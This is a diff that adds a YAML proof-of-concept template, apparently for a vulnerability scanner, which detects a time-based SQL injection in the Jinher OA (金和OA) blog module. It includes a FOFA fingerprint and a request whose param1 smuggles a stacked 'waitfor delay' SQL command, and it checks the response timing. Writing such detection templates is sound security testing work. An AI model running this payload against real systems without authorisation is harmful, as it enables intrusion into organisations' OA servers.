@@ -1,0 +1,29 @@
+id: poc-yaml-jinher-jhsoft-web-blog-sqli
+info:
+  name: 金和OA Jhsoft.Web.blog SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
+  expression: contains(body,"JHSoft")
+- method: GET
+  path: /c6/Jhsoft.Web.blog/XmlHttp.aspx/?Operation=delPhoto&param1=1;waitfor+delay%270:0:{{.t1}}%27--&param2=1
+  expression: 'status_code == 200 &&
+
+    contains(headers,"ASP.NET_SessionId=") &&
+
+    body == "ok" &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
